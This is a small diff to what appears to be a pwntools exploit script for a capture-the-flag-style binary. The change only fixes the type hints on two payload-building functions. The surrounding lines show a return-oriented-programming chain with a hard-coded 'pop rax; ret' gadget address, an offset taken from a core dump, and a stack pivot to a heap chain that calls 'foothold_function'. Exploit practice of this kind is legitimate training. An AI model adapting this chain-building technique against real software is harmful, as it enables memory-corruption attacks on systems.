@@ -16,7 +16,7 @@ stack = core.rsp
 offset = core.read(stack, 4)
 
 # craft payload
-def build_stack_payload(heap_addr: int) -> list[object]:
+def build_stack_payload(heap_addr: int) -> bytes:
     return flat(
         { offset : 0x00000000004009bb }, # pop rax; ret
         heap_addr,          # we need to pivot to the heap chain
@@ -28,7 +28,7 @@ def build_stack_payload(heap_addr: int) -> list[object]:
 #     { offset : elf.symbols.foothold_function }
 # )
 
-def build_heap_payload() -> list[object]:
+def build_heap_payload() -> bytes:
     return flat(
         elf.symbols.foothold_function, # must be on heap, this fails on stack
         0x00000000004009bb, # pop rax; ret; 
